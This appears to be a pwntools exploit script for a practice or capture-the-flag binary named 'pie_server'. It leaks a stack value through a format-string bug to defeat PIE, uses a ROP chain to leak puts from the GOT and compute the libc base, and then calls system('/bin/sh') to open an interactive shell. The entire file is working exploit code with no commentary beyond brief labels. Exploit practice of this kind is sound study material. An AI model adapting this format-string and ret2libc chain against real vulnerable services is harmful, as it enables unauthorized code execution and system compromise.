from pwn import *

elf = context.binary = ELF('./pie_server')
io = process()
libc = elf.libc




### Leak PIE
io.sendline('%4$p')
io.recvuntil(b'Hello ')

elf_leak = int(io.recvline(), 16)

elf.address = elf_leak - 0x56b5
log.success(f'PIE base: {[hex(elf.address)]}')




# Update values
offset = 264
ret = 0x1016

new_ret = elf.address + ret




### ROP chain for elf object
rop = ROP(elf)

# Leak puts
rop.puts(elf.got.puts)
rop.vuln()
pprint(rop.dump())

# Send payload
io.sendlineafter(b':P\n', flat({offset: rop.chain()}))

io.recvline()

# Receive Leaked puts
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
log.success(f'Leaked got_puts: {[hex(got_puts)]}')

# Calculate Libc base
libc.address = got_puts - libc.symbols.puts
log.success(f'Libc base: {[hex(libc.address)]}')






### ROP chain for libc object
rop = ROP(libc)

# Align the stack
rop.raw(new_ret)
rop.system(next(libc.search(b'/bin/sh\x00')))
pprint(rop.dump())

# Send payload
io.sendline(flat({offset: rop.chain()}))
io.interactive()